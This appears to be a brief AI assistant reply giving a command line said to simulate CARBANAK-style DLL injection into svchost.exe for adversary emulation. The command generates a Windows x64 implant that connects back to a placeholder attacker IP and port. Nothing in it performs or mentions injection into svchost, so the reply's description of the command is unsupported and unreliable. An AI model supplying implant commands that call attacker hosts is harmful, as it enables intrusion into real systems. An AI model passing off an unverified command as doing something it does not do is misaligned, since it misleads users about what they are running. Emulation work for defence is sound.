Here are the command lines that simulate the CARBANAK DLL injection into the svchost.exe process:

Command: `gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport`
Replace `<ip>` and `<port>` with the actual IP address and port number used by the attacker.

Note that I did not include any specific file names, as the documentation does not provide information on which DLL is being injected.
